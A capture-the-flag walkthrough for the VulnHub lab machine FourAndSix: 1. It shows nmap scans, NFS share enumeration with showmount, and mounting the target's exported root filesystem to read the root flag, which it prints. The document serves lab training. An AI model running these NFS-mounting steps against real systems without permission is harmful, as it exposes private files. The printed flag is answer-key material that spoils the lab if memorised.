:::::::::::::::::::::::: page
# FourAndSix: 1 {#fourandsix-1 .title}

\

## 

## FourAndSix: 1

- **[FourAndSix: 1]{style="color:#f66151;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/fourandsix-1,236/>

![](images/839-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#f6d32d;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/839-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.191
:::

![](images/839-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.191
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.191
:::

1.  [NFS Enumeration]{style="color:#f6d32d;"} :

- Check the shared folder access to everyone :

::: codebox
    showmount -e 192.168.2.191
:::

![](images/839-4.png)

- Mount the NFS Share :

::: codebox
    mkdir shared_dir
:::

- 

::: codebox
    mount -t nfs 192.168.2.191:/shared ./shared_dir
:::

- 

::: codebox
    cd shared_dir
:::

- 

::: codebox
    ls
:::

![](images/839-5.png)

- Let's try and mount this image file to see the contents in it :

::: codebox
    mkdir -p usb
:::

- 

::: codebox
    mount -o loop USB-stick.img ./usb
:::

- 

::: codebox
    cd usb
:::

- 

::: codebox
    ls -lh
:::

![](images/839-6.png) But we obtained nothing useful at all .

- Let's check and see if the root directory is shareable or not :

::: codebox
    mkdir main
:::

- 

::: codebox
    mount 192.168.2.191:/ main
:::

- 

::: codebox
    cd main
:::

- 

::: codebox
    ls -la
:::

![](images/839-7.png) root directory is shareable .

- Let's move in the root directory :

::: codebox
    cd root
:::

- 

::: codebox
    ls -la
:::

- 

::: codebox
    cat proof.txt 
:::

![](images/839-8.png)

- We got the root flag :

::: codebox
    904b4a46b21bbf13dbe53d21a3cd024f
:::
::::::::::::::::::::::::
